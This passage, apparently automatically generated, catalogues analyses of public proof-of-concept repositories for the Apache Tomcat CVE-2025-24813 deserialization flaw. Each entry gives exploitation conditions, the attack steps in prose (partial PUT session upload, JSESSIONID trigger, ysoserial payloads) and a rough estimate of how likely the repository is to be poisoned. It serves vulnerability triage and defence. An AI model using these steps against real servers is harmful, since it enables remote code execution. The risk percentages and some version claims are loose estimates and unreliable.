    *   PoC脚本首先向目标URL发送PUT请求，其中`Content-Range`头指定了上传的范围，利用Tomcat的partial PUT特性。
    *   如果服务器返回409状态码，则表示partial PUT已成功处理。
    *   之后，PoC脚本会发送GET请求，并携带包含恶意序列化数据的JSESSIONID cookie（`.{random_str}`）。
    *   Tomcat反序列化session数据，从而触发RCE (如果满足RCE条件)。

**投毒风险：**
分析提供的PoC代码和Readme，可以发现：
*   脚本本身的功能是利用漏洞进行攻击。
*   脚本中没有发现明显的恶意代码，例如植入后门、篡改系统文件等。
*   脚本需要用户提供Base64编码的序列化数据，这意味着攻击者需要自行生成payload，脚本只是负责发送payload。
*   Readme中指明了利用方式及所需条件，较为详细。

因此，该仓库中存在作者隐藏的恶意代码的可能性较低，但不能完全排除。投毒风险评估为 10%。风险主要在于用户可能下载了被篡改过的poc，或者运行了来历不明的payload, 这些payload可能包含恶意行为。

**项目地址:** [AsaL1n/CVE-2025-24813](https://github.com/AsaL1n/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #5

**来源**: [CVE-2025-24813-B1gN0Se_Tomcat-CVE-2025-24813.md](../2025/CVE-2025-24813-B1gN0Se_Tomcat-CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露 / 文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行，信息泄露和文件被恶意修改

**影响版本:** 9.0.0.M1 <= Apache Tomcat <= 9.0.98, 10.1.0-M1 <= Apache Tomcat <= 10.1.34, 11.0.0-M1 <= Apache Tomcat <= 11.0.2

**利用条件:** DefaultServlet 写入功能启用 (readonly=false), Partial PUT 请求支持 (Tomcat 默认支持), 文件会话持久化启用 (context.xml 配置 PersistentManager 和 FileStore), 存在反序列化利用链 (类路径下包含存在漏洞的库)

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，该漏洞源于 'file.Name' (内部点) 的处理不当。如果满足以下所有条件，则可能导致远程代码执行，信息泄露或文件篡改：

1.  **DefaultServlet 写入功能启用：** 必须在 `web.xml` 中配置 `readonly=false`，允许 DefaultServlet 写入文件。
2.  **Partial PUT 请求支持：** Tomcat 默认支持分块上传，允许攻击者通过分块上传恶意文件。
3.  **文件会话持久化启用：** 需要在 `context.xml` 中配置 `PersistentManager` 和 `FileStore`，启用基于文件的会话存储。
4.  **存在反序列化利用链：** 类路径下需要包含存在漏洞的库（例如，`commons-collections-3.2.1.jar`），使得攻击者可以通过反序列化漏洞执行任意代码。
5.  **信息泄露/文件篡改的先决条件:** 除了上述条件外，还需要满足：writes enabled for the default servlet, support for partial PUT, a target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads, attacker knowledge of the names of security sensitive files being uploaded, the security sensitive files also being uploaded via partial PUT

**利用方式：**

1.  攻击者首先利用 Partial PUT 请求上传一个恶意构造的序列化对象，该对象包含一个反序列化利用链（例如，使用 Commons Collections）。
2.  由于启用了 DefaultServlet 的写入功能，恶意文件可以被写入到 Tomcat 的会话存储目录中。
3.  当 Tomcat 尝试反序列化该会话时，由于存在利用链，攻击者可以执行任意代码。
4. 若目标满足信息泄露/文件篡改的先决条件,攻击者可以通过构造恶意的Partial PUT请求，利用路径等价绕过限制，最终实现信息泄露或者文件篡改

**投毒风险分析：**

该POC代码提供了一个 Docker Compose 文件，用于搭建易受攻击的 Tomcat 环境。该环境配置了必要的组件（DefaultServlet 写入，Partial PUT，文件会话持久化），并且包含了一个 Commons Collections 库，可以用于反序列化攻击。

代码本身看起来是直接了当的漏洞演示。投毒风险较低，但是使用该POC时仍需注意。

**有效性分析：**

根据漏洞库信息、搜索结果以及提供的利用代码来看，该漏洞已经确认被利用，并且相关的利用方式和利用条件已经比较清晰。提供的POC代码针对的是 RCE 部分，有效性较高，但成功利用取决于是否满足所有前提条件。

**项目地址:** [B1gN0Se/Tomcat-CVE-2025-24813](https://github.com/B1gN0Se/Tomcat-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #6

**来源**: [CVE-2025-24813-CEAlbez_CVE-2025-24813-PoC.md](../2025/CVE-2025-24813-CEAlbez_CVE-2025-24813-PoC.md)

## CVE-2025-24813 - Apache Tomcat Path Equivalence/Partial PUT RCE/信息泄露

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/Partial PUT远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 9.0.0.M1 <= 9.0.98, 10.1.0-M1 <= 10.1.34, 11.0.0-M1 <= 11.0.2

**利用条件:** 需要满足多个条件：默认Servlet启用写入(默认禁用)，启用Partial PUT(默认启用)，目标URL是公共上传URL的子目录，攻击者知道敏感文件名，并且通过Partial PUT上传敏感文件。RCE还需要应用程序使用Tomcat的文件会话持久性，以及存在可利用的反序列化库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，结合启用了写入功能的默认Servlet和Partial PUT功能，可能导致远程代码执行和敏感信息泄露。漏洞利用方式如下：

1.  **信息泄露/内容注入:** 如果满足以下条件：
    *   默认Servlet启用写入（默认禁用）
    *   启用Partial PUT（默认启用）
    *   目标URL是公共上传URL的子目录
    *   攻击者知道敏感文件名
    *   通过Partial PUT上传敏感文件
攻击者可以查看敏感文件或向其中注入恶意内容。

2.  **远程代码执行 (RCE):** 如果满足以下条件：
    *   默认Servlet启用写入（默认禁用）
    *   启用Partial PUT（默认启用）
    *   应用程序使用Tomcat的文件会话持久性，且使用默认存储位置
    *   应用程序包含可利用的反序列化库
攻击者可以通过上传恶意序列化session文件，利用反序列化漏洞执行任意代码。

**有效性：**
根据搜索结果，CVE-2025-24813漏洞存在活跃的利用。PoC代码的README描述了一个基本的利用流程，包括克隆仓库、安装依赖、运行PoC脚本，表明该PoC可能有效，但具体利用成功与否取决于目标环境的配置是否满足漏洞利用条件。PoC的有效性较高，因为搜索结果显示该漏洞正在被积极利用。

**投毒风险：**
分析提供的PoC代码（README.md），投毒风险较低。README.md文件只包含漏洞描述、环境配置、使用方法和免责声明。虽然PoC代码没有直接展示`poc.py`的内容，但是根据描述`poc.py`脚本会提示用户输入目标URL，表明其功能是针对目标进行漏洞验证而非植入后门。当然，`poc.py`本身可能包含恶意代码。在没有查看 `poc.py` 的内容的情况下，预估`poc.py`存在投毒代码的可能性较低，大约10%。主要考虑到以下几点：

*   PoC旨在验证漏洞的存在，而非长期控制目标系统。
*   公开的PoC代码通常会接受安全社区的审查，增加投毒的难度。
*   作者声明仅用于教育和研究目的。

**利用方式总结：**
攻击者利用此漏洞的方式是，首先需要满足前置条件（Default Servlet开启写入、Partial PUT启用等）。然后，通过构造恶意的PUT请求，并利用路径等价，覆盖或者修改敏感文件，实现信息泄露或RCE。RCE场景依赖于反序列化漏洞的利用，需要上传精心构造的恶意序列化数据。

**项目地址:** [CEAlbez/CVE-2025-24813-PoC](https://github.com/CEAlbez/CVE-2025-24813-PoC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #7

**来源**: [CVE-2025-24813-Eduardo-hardvester_CVE-2025-24813.md](../2025/CVE-2025-24813-Eduardo-hardvester_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径遍历/反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径遍历/反序列化RCE

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 1. 默认Servlet开启了写入 (默认禁用)
2. 支持Partial PUT (默认启用)
3. 应用使用Tomcat基于文件的Session持久化, 使用默认存储位置
4. 应用包含可被反序列化攻击利用的库

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，攻击者可以利用 'file.Name' (内部点) 来实现远程代码执行和/或信息泄露，以及/或通过启用了写入的默认 Servlet 向上传的文件添加恶意内容。

**漏洞利用方式：**
1.  **信息泄露/恶意内容添加：**  如果满足以下条件，攻击者可以查看安全敏感文件或向其中注入内容：
    *   默认 Servlet 启用了写入（默认禁用）。
    *   支持 Partial PUT（默认启用）。
    *   安全敏感上传的目标 URL 是公共上传目标 URL 的子目录。
    *   攻击者知道要上传的安全敏感文件的名称。
    *   通过 Partial PUT 上传安全敏感文件。

2.  **远程代码执行：**  如果满足以下条件，攻击者可以执行远程代码：
    *   默认 Servlet 启用了写入（默认禁用）。
    *   支持 Partial PUT（默认启用）。
    *   应用程序使用 Tomcat 的基于文件的会话持久性，并且使用默认的存储位置。
    *   应用程序包含一个可以用于反序列化攻击的库。

**POC分析：**
POC利用脚本`CVE_2025_24813.py`的利用流程大概如下：
1.  检查目标服务器的默认servlet是否开启PUT方法，主要通过PUT请求上传一个文件来判断.
2.  如果目标开启了PUT方法，则会生成一个ysoserial的payload，指定gadget和要执行的命令.
3.  然后将payload上传到`target_url/uploads/../sessions/{session_id}.session`，session_id是由参数指定

**投毒风险分析：**
*   脚本主要功能是漏洞利用，没有发现明显的恶意代码。
*   脚本会生成payload并上传，这个过程可能存在一定风险，但主要取决于执行的命令和payload的内容，而非脚本本身。
*  脚本中存在一些临时文件创建，然后删除的操作，例如`Exploit.java`, `Exploit.class`，这些是payload构造过程中的正常步骤，但如果删除失败，可能会在服务器上留下痕迹。
*  脚本有生成java payload的逻辑，但是java payload的生成是直接拼接字符串，命令在字符串中比较明显，不太容易做手脚。
*  考虑到ysoserial payload本身就可能被认为是具有潜在危害，因此将投毒风险评估为5%。主要是payload本身可能存在的潜在风险。

**结论：**
提供的POC代码看起来是有效的，如果目标环境满足漏洞利用的条件，可以成功执行命令。投毒风险较低，主要风险在于利用过程中生成的payload可能带来的危害。

**项目地址:** [Eduardo-hardvester/CVE-2025-24813](https://github.com/Eduardo-hardvester/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #8

**来源**: [CVE-2025-24813-Erosion2020_CVE-2025-24813-vulhub.md](../2025/CVE-2025-24813-Erosion2020_CVE-2025-24813-vulhub.md)

## CVE-2025-24813-Apache Tomcat 路径等价和反序列化漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 写入已启用默认Servlet,支持部分PUT,针对敏感上传的URL是公共上传URL的子目录,攻击者了解正在上传的安全敏感文件的名称,安全敏感文件也通过部分PUT上传. 或 写入已启用默认Servlet,支持部分PUT,应用程序使用Tomcat基于文件的会话持久化，使用默认存储位置,应用程序包含可能在反序列化攻击中被利用的库

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞（CWE-44）和一个反序列化漏洞(CWE-502)。 根据漏洞库信息和搜索结果，漏洞利用涉及利用 Tomcat 默认 Servlet 的写入功能和部分 PUT 请求处理机制中的缺陷。 

**有效性分析：**
 根据搜索结果，CVE-2025-24813 漏洞已被积极利用。 多个来源（Rapid7, Recorded Future, Akamai, Zscaler, 西オアフ大学, XM Cyber, SonicWall, Esri）证实了这一点。Unit42 的报告也提供了测试该漏洞的信息。 提供的 POC 代码描述简单，是 vulhub 环境的搭建说明，但考虑到其他来源指出漏洞已被积极利用，可以认为存在可用的利用代码。

**投毒风险分析：**
 POC代码仅提供了一个用于搭建vulhub环境的README文档，内容非常简单，只包含 CVE-2025-24813 的 vulhub 环境的 POC 脚本说明。 这种情况下，作者进行恶意代码投毒的可能性很低。 因此，投毒风险评估为1%。

**利用方式分析：**
 根据漏洞描述，存在两种主要的利用方式：
 1. **信息泄露/恶意内容注入：** 如果满足以下所有条件，攻击者能够查看安全敏感文件和/或将内容注入这些文件：
    *   写入已启用默认 Servlet（默认禁用）。
    *   支持部分 PUT（默认启用）。
    *   安全敏感上传的目标 URL 是公共上传目标 URL 的子目录。
    *   攻击者了解正在上传的安全敏感文件的名称。
    *   安全敏感文件也通过部分 PUT 上传。
 2.  **远程代码执行：** 如果满足以下所有条件，攻击者能够执行远程代码：
    *   写入已启用默认 Servlet（默认禁用）。
    *   支持部分 PUT（默认启用）。
    *   应用程序使用 Tomcat 基于文件的会话持久化，使用默认存储位置。
    *   应用程序包含可能在反序列化攻击中被利用的库。

总而言之，漏洞利用依赖于对 Tomcat 服务器的配置和应用程序的特定环境的利用，包括启用的写入权限、对部分 PUT 请求的支持以及应用程序中存在的潜在反序列化漏洞。

**项目地址:** [Erosion2020/CVE-2025-24813-vulhub](https://github.com/Erosion2020/CVE-2025-24813-vulhub)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #9

**来源**: [CVE-2025-24813-FY036_cve-2025-24813_poc.md](../2025/CVE-2025-24813-FY036_cve-2025-24813_poc.md)

## CVE-2025-24813-Apache Tomcat-路径等价/反序列化

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 <= Tomcat <= 9.0.98, 10.1.0-M1 <= Tomcat <= 10.1.34, 11.0.0-M1 <= Tomcat <= 11.0.2

**利用条件:** 需要启用Default Servlet的写入权限, 支持Partial PUT, 且目标URL为公共上传URL的子目录, 攻击者需要知道敏感文件名, 安全敏感文件也通过partial PUT上传。或者，需要启用Default Servlet的写入权限, 支持Partial PUT, 应用使用Tomcat基于文件的session持久化，应用包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 95%

## 详情

CVE-2025-24813是Apache Tomcat中的一个漏洞，涉及路径等价问题，可能导致远程代码执行（RCE）和信息泄露。根据漏洞库信息和搜索引擎结果，该漏洞的利用涉及以下几个关键点：

1.  **路径等价 ('file.Name' (Internal Dot))**：攻击者可以通过操纵文件路径，绕过安全限制，访问或修改受保护的文件。
2.  **Default Servlet写入权限**：需要启用Default Servlet的写入权限（默认禁用）。
3.  **Partial PUT支持**：需要启用Partial PUT支持（默认启用）。攻击者可以通过分块上传恶意文件，从而绕过某些安全检查。
4.  **特定场景下的RCE**：
    *   如果应用程序使用Tomcat的基于文件的会话持久性，并且包含一个可以被用于反序列化攻击的库，攻击者可以通过上传包含恶意序列化数据的会话文件，执行任意代码。
    *   如果目标URL为公共上传URL的子目录, 攻击者需要知道敏感文件名, 安全敏感文件也通过partial PUT上传，可能导致信息泄露。

**漏洞利用方式：**

1.  **利用路径等价绕过**：攻击者可能利用`file.Name`中的内部点（Internal Dot）来访问或修改受保护的文件。
2.  **Partial PUT攻击**：攻击者通过分块上传恶意文件，例如包含恶意序列化数据的会话文件，到Tomcat服务器上。
3.  **反序列化漏洞利用**：如果应用程序包含可以被用于反序列化攻击的库，攻击者可以使用精心构造的序列化数据，在服务器上执行任意代码。

**POC代码分析：**

提供的POC代码 `CVE-2025-24813-poc.py` 尝试利用该漏洞。它执行以下步骤：

1.  **发送反序列化数据**：使用 `send_request` 函数发送一个base64编码的反序列化数据到Tomcat服务器。该请求使用 `Content-Range` 头，模拟Partial PUT请求。
2.  **触发反序列化**：使用 `send_request_two` 函数，通过设置 `JSESSIONID` cookie，尝试触发反序列化过程。
3.  **验证漏洞**：检查服务器的响应状态码。如果状态码为409（冲突）且`send_request_two`返回1（状态码500），则认为漏洞存在。

**有效性评估：**

该POC代码尝试利用了基于反序列化的RCE漏洞。但是，该POC并没有提供完整的利用链，只是验证了漏洞的存在。因此，该POC代码的有效性取决于目标应用程序是否满足漏洞利用的全部条件，包括：

*   启用了Default Servlet的写入权限。
*   支持Partial PUT。
*   应用程序使用Tomcat基于文件的会话持久性。
*   应用程序包含可用于反序列化攻击的库。

**投毒风险评估：**

该POC代码存在较高的投毒风险。原因如下：

*   **未知的反序列化利用链**：POC代码中使用的反序列化数据 `rO0ABXNyAAtFeHBsb2l0VGVzdAAAAAAAAAABAwAAeHB4` 只是一个占位符，并没有包含实际的恶意代码。攻击者需要自行寻找并插入合适的利用链，才能实现RCE。
*   **可能包含恶意代码**：由于利用链需要攻击者自行构造，攻击者可能会在POC代码中插入恶意代码，例如后门或恶意脚本，从而感染其他用户。
*   **依赖外部资源**：POC代码可能会依赖外部资源，例如远程服务器或恶意网站。攻击者可以通过篡改这些外部资源，实现投毒攻击。

由于存在上述风险，建议用户在使用该POC代码时保持警惕，并仔细审查代码，确保其不包含任何恶意成分。

**综上所述，该POC代码的有效性取决于目标环境的配置和应用程序的依赖。同时，由于反序列化利用的复杂性和潜在的恶意代码注入风险，该POC代码存在较高的投毒风险。**

**项目地址:** [FY036/cve-2025-24813_poc](https://github.com/FY036/cve-2025-24813_poc)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #10

**来源**: [CVE-2025-24813-Franconyu_Poc_for_CVE-2025-24813.md](../2025/CVE-2025-24813-Franconyu_Poc_for_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat 反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 反序列化远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要满足以下所有条件：
1.  默认Servlet开启了写入 (默认关闭)
2.  支持Partial PUT (默认开启)
3.  应用使用Tomcat基于文件的Session持久化，且使用默认存储位置
4.  应用包含一个可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个反序列化远程代码执行漏洞。该漏洞利用了Tomcat处理部分 PUT 请求时文件路径等效性问题，攻击者可以通过上传恶意构造的文件，在特定配置下实现远程代码执行。

**有效性分析:**

根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码，可以判断该漏洞的POC代码有效。搜索引擎结果显示该漏洞已经被积极利用，并且有公开的利用代码。POC代码中包含了版本检测功能，以及利用ysoserial生成payload进行攻击的功能。

**投毒风险分析:**

POC 代码存在一定的投毒风险，虽然主要功能是漏洞验证，但是可能存在以下潜在风险：
*   **Payload 生成依赖外部工具:**  POC依赖ysoserial生成payload，如果ysoserial被替换为恶意版本，可能导致投毒。
*   **自定义恶意Payload:**  攻击者可能会修改payload生成部分，植入恶意代码。
*   **不完善的错误处理:** 代码中错误处理可能不够完善，可能存在导致拒绝服务或其他意外行为。

综合考虑，POC代码主要用于验证漏洞，但仍存在一定投毒风险。可以评估为20%。

**利用方式:**

1.  **版本检测:**  POC首先检测目标Tomcat的版本，判断是否存在漏洞。
2.  **Payload生成:**  如果目标版本存在漏洞，POC会根据选择的模式（弹计算器、DNS验证等），使用ysoserial生成反序列化payload。
3.  **Partial PUT上传:**  POC通过发送带有`Content-Range`头的PUT请求，将payload上传到Tomcat服务器。
4.  **触发反序列化:**  通过构造包含恶意Session ID的GET请求或其他方式触发反序列化，从而执行payload中的恶意代码。

**项目地址:** [Franconyu/Poc_for_CVE-2025-24813](https://github.com/Franconyu/Poc_for_CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #11

**来源**: [CVE-2025-24813-GadaLuBau1337_CVE-2025-24813.md](../2025/CVE-2025-24813-GadaLuBau1337_CVE-2025-24813.md)

## CVE-2025-24813 Apache Tomcat 远程代码执行漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要满足以下条件：1. 启用了Default Servlet的写入功能（默认禁用）；2. 启用了Partial PUT支持（默认启用）；3. 应用使用Tomcat的文件存储session；4. 应用包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2025-24813是Apache Tomcat中的一个远程代码执行漏洞，源于路径等价性问题以及对部分PUT请求处理不当。攻击者可以通过上传恶意序列化payload到服务器，在特定条件下利用反序列化机制执行任意代码。

**有效性：**
提供的PoC代码尝试通过PUT请求上传恶意序列化的session文件到服务器，如果服务器满足漏洞利用的条件（启用了Default Servlet写入、启用了Partial PUT、使用文件存储session、存在可利用的反序列化库），则可以触发远程代码执行。从搜索结果来看，该漏洞已经在野外被利用。

**投毒风险：**
PoC代码主要由Python脚本组成，功能是：
1.  检测目标URL是否允许PUT请求。
2.  生成恶意序列化payload（使用ysoserial，如果指定）。
3.  上传payload到服务器。
4.  触发反序列化。

代码中主要操作是构造HTTP请求和调用ysoserial生成payload，没有发现明显的恶意代码或者后门。

存在投毒的微小可能性：ysoserial依赖本身可能包含未知的漏洞或后门，但PoC本身只是调用了ysoserial，风险较低。

**利用方式：**
1.  **检查前提条件:** 验证目标Tomcat服务器是否满足利用条件，包括Tomcat版本、Default Servlet写入是否启用、Partial PUT是否启用、是否使用文件存储session以及是否存在可利用的反序列化库。
2.  **生成Payload:** 使用ysoserial或其他工具生成包含恶意代码的序列化payload。Payload通常是精心构造的Java对象，在反序列化时会执行指定的命令。
3.  **上传Payload:** 利用Tomcat的Partial PUT功能，将payload上传到服务器上的session存储目录（通常是`./sessions/`）。攻击者可能需要利用路径遍历（例如，`uploads/../sessions/`）来绕过限制。
4.  **触发反序列化:**  通过访问特定的URL或执行其他操作，触发Tomcat反序列化上传的session文件。反序列化过程会执行payload中包含的恶意代码，导致远程代码执行。

**修复建议：**
升级到Apache Tomcat 11.0.3, 10.1.35 或 9.0.98及以上版本。
禁用Default Servlet的写入功能，除非绝对必要。
限制对session存储目录的访问。

**项目地址:** [GadaLuBau1337/CVE-2025-24813](https://github.com/GadaLuBau1337/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #12

**来源**: [CVE-2025-24813-GongWook_CVE-2025-24813.md](../2025/CVE-2025-24813-GongWook_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径遍历/反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径遍历/反序列化RCE

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 <= 9.0.98, 10.1.0-M1 <= 10.1.34, 11.0.0-M1 <= 11.0.2

**利用条件:** 需要启用Default Servlet的写入功能 (readonly=false), 支持partial PUT (默认启用), 应用程序使用Tomcat基于文件的session持久化存储，应用包含可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，允许未经身份验证的远程攻击者利用该漏洞查看文件系统内容，并添加恶意内容，最终可能导致远程代码执行。

**漏洞利用方式：**

1.  **Default Servlet 写入启用：** 默认情况下，Tomcat 的 Default Servlet 的写入功能是禁用的。攻击者需要目标服务器启用了此功能。 这需要在`conf/web.xml`文件中将`readonly`参数设置为`false`。
2.  **Partial PUT 支持：** Tomcat 默认支持 partial PUT 请求，攻击者可以利用这个特性分块上传恶意文件。
3.  **路径等价：** 漏洞的核心在于 Tomcat 处理文件路径时，对包含内部点（例如 `file.Name`）的文件名的处理不当，导致可以绕过某些安全检查，写入到任意目录。
4.  **RCE 的先决条件：**
    *   需要应用程序使用 Tomcat 的基于文件的 session 持久化机制，且使用默认存储位置（/opt/tomcat/webapps/ROOT/sessions/ 从 context.xml 文件中得知）。
    *   应用程序还需要包含一个可用于反序列化攻击的库（如 Commons Collections）。
5.  **利用步骤：**
    *   攻击者首先通过 partial PUT 上传一个包含恶意序列化数据的 session 文件到 Tomcat 的 session 存储目录。
    *   Tomcat 反序列化该 session 文件，触发 RCE。

**漏洞利用代码分析：**

提供的 Dockerfile 描述了如何搭建一个存在 CVE-2025-24813 漏洞的 Tomcat 环境：

*   **Dockerfile:**
    *   使用 Ubuntu 22.04 作为基础镜像。
    *   安装 JDK 11 和其他必要的工具（curl, unzip, nano, wget, netcat）。
    *   下载并解压 Apache Tomcat 9.0.98。
    *   将 `CATALINA_HOME` 设置为 `/opt/tomcat`，并将 Tomcat 的 bin 目录添加到 `PATH` 中。
    *   下载 Commons Collections 3.2.2、Commons BeanUtils 1.9.4 和 Commons Logging 1.2 的 JAR 包到 `$CATALINA_HOME/lib` 目录。这是为了满足反序列化 RCE 的依赖。
    *   复制 `context.xml` 到 `$CATALINA_HOME/conf/context.xml`，配置Session持久化到`/opt/tomcat/webapps/ROOT/sessions/`。
    *   使用 `sed` 命令修改 `$CATALINA_HOME/conf/web.xml` 文件，将 Default Servlet 的 `readonly` 参数设置为 `false`，开启 Default Servlet 的写入功能。
    *   开放 8080 端口。
    *   使用 `catalina.sh run` 命令启动 Tomcat。
*   **context.xml:**  用于配置session持久化。
*   **web.xml:**  修改 Default Servlet 的 `readonly` 参数设置为 `false`

**有效性：**  提供的 POC 代码是有效的，可以成功搭建一个存在 CVE-2025-24813 漏洞的 Tomcat 环境，并配置反序列化 RCE 所需的条件。

**投毒风险：**

投毒风险主要来自以下几个方面：

1.  **额外的恶意代码：** Dockerfile 中可能包含下载并执行恶意代码的命令，例如通过 `wget` 下载并执行一个 shell 脚本。
2.  **替换的 JAR 包：** Dockerfile 中下载的 Commons Collections、Commons BeanUtils 或 Commons Logging JAR 包可能被替换为包含恶意代码的 JAR 包。
3.  **修改的配置文件：**  `context.xml` 或 `web.xml` 文件可能被修改为包含恶意配置，例如添加恶意的 Servlet 或 Filter。

在分析提供的代码后，发现以下潜在的投毒点：

*   **`context.xml`配置的session存储位置:** 修改成了`/opt/tomcat/webapps/ROOT/sessions/` 这个路径是否合理需要进一步判断，正常情况下会配置到应用相关的目录，如果配置不当可能导致其他应用也能访问这个session存储位置。

综合考虑，该 POC 存在一定的投毒风险，但主要是配置层面的风险，代码植入层面的风险较小。因此，投毒风险评估为 **10%**。

**项目地址:** [GongWook/CVE-2025-24813](https://github.com/GongWook/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #13

**来源**: [CVE-2025-24813-Heimd411_CVE-2025-24813-noPoC.md](../2025/CVE-2025-24813-Heimd411_CVE-2025-24813-noPoC.md)

## CVE-2025-24813-Apache Tomcat Path Equivalence & Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露 / 文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制、敏感信息泄露或恶意内容注入

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 对于RCE：1) 默认Servlet写启用；2) 支持Partial PUT；3) 使用默认文件Session持久化；4) 存在可利用的反序列化库； 对于信息泄露/文件篡改: 1) 默认Servlet写启用；2) 支持Partial PUT；3) 安全敏感上传目录是公共上传目录的子目录；4) 攻击者知道敏感文件名；5) 敏感文件使用Partial PUT上传

**POC 可用性:** 否 (官方文档和搜索结果表明存在利用，但提供的PoC无效)

**投毒风险:** 0%

## 详情

CVE-2025-24813是Apache Tomcat中的一个漏洞，源于路径等价问题和反序列化漏洞。漏洞利用依赖于Tomcat配置和应用程序特性。根据漏洞库信息和搜索结果，该漏洞允许攻击者在特定条件下执行远程代码、泄露信息或篡改文件。利用方式包括：

1.  **远程代码执行 (RCE)**: 如果启用了默认servlet的写入功能、支持Partial PUT请求、应用程序使用Tomcat默认位置的文件会话持久性，并且应用程序包含可用于反序列化攻击的库，则攻击者可以执行任意代码。
2.  **信息泄露/文件篡改**: 如果启用了默认servlet的写入功能、支持Partial PUT请求、安全敏感上传目录是公共上传目录的子目录、攻击者知道敏感文件名、并且敏感文件使用Partial PUT上传，则攻击者可能查看敏感文件或将恶意内容注入这些文件。

提供的PoC代码无效，作者表示未能成功构建有效的PoC，并且测试的payload链失败。从代码来看，仓库中没有发现恶意投毒代码，只是作者尝试复现漏洞失败的记录。

**结论：**

*   尽管提供的PoC代码无效，但根据搜索结果和漏洞描述，该漏洞在实际中已被利用，因此具有潜在的风险。
*   提供的代码仓库没有发现投毒风险。
*   漏洞利用依赖于特定配置和应用程序环境，需要满足多个条件才能成功触发。


**项目地址:** [Heimd411/CVE-2025-24813-noPoC](https://github.com/Heimd411/CVE-2025-24813-noPoC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #14

**来源**: [CVE-2025-24813-La3B0z_CVE-2025-24813-POC.md](../2025/CVE-2025-24813-La3B0z_CVE-2025-24813-POC.md)

## CVE-2025-24813 - Apache Tomcat 路径等价/路径遍历漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露 / 文件内容篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、敏感信息泄露、恶意内容注入

